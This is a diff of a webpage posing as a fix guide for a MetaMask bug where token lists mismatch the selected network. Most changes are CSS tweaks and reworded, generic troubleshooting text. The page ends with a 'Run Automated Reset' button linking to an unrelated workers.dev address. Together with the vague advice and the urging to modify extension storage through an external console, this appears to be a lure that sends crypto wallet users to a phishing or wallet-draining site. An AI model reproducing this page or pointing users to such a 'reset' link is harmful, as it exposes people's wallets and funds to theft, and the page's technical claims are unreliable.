@@ -3,7 +3,7 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Assets Manage Tokens Miss Match With Net – Fix Guide</title>
 <style>
     body {
-        font-family: BlinkMacSystemFont;
+        font-family: system-ui;
         background: #1a1a24;
         color: #ddd;
         padding: 20px;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #00adb5; }
     .btn {
-        background: #cf6679;
+        background: #ff9455;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,35 +42,36 @@
 <h1>Metamask Extension Bug Assets Manage Tokens Miss Match With Net</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users experience a mismatch between the tokens listed in the Metamask extension's "Assets" and "Manage Tokens" sections, particularly when filtering by network, resulting in some tokens not being displayed as expected.</li>
+<li>Users experience a mismatch between the tokens displayed in the Metamask extension's "Assets" and "Manage Tokens" sections, specifically when filtering by network. The token list does not update correctly, causing confusion and potential issues with transactions.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a bug in the Metamask extension that causes a discrepancy between the tokens stored locally and those retrieved from the Ethereum network, leading to an inconsistent display of tokens when managing assets.</li>
+<li>The error occurs due to a bug in the Metamask extension's token management system, which fails to properly synchronize the token list with the selected network filter. This results in a discrepancy between the expected and actual tokens displayed.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, users can attempt the following overrides:</li>
-<li>Clear the Metamask extension's local storage and restart the browser</li>
-<li>Manually add the missing tokens using their contract addresses</li>
-<li>Update the Metamask extension to the latest version and reset the token list</li>
+<li>To resolve the issue, users can attempt the following manual overrides:</li>
+<li>Reset the Metamask extension's settings to default values</li>
+<li>Manually add the missing tokens using the <code>token_address</code> and <code>token_symbol</code> in the following JSON format:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;tokenAddress&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...contract address...&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;tokenSymbol&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;...token symbol...&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;tokenDecimal&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">18</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;tokenImage&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;...token image URL...&quot;</span>
+<span class="w">  </span><span class="nt">&quot;token_address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...token_address...&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;token_symbol&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;TOKEN_SYMBOL&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;token_decimal&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">18</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for further debugging and customization of token management settings.</p>
+<ul>
+<li>Clear the browser's local storage and reload the Metamask extension
+Consider using an external console to inspect and modify the extension's storage for more advanced troubleshooting.</li>
+</ul>
 <h2>Prerequisites</h2>
 <ul>
-<li>Metamask extension installed and enabled</li>
-<li>Ethereum network connection established</li>
-<li>Latest version of the browser being used</li>
+<li>Metamask extension installed and configured</li>
+<li>Ethereum network selected and connected</li>
+<li>Basic understanding of JSON data format and token management in Metamask</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/critical-trc-20-energy-spike-error.html">Critical Trc 20 Energy Spike Error</a></li><li><a href="./archive/2026/06/metamask-extension-bug-notifications-notification-badge-red-num.html">Metamask Extension Bug Notifications Notification Badge Red Num</a></li><li><a href="./archive/2026/06/metamask-extension-bug-importing-a-custom-token-does-not-work.html">Metamask Extension Bug Importing A Custom Token Does Not Work</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/go-ethereum-error-in-block-freeze-operation-errcanonical-hash-m.html">Go Ethereum Error In Block Freeze Operation Errcanonical Hash M</a></li><li><a href="./archive/2026/06/metamask-extension-bug-activity-send-nft-displays-id-as-if-it-w.html">Metamask Extension Bug Activity Send Nft Displays Id As If It Were Amount</a></li><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
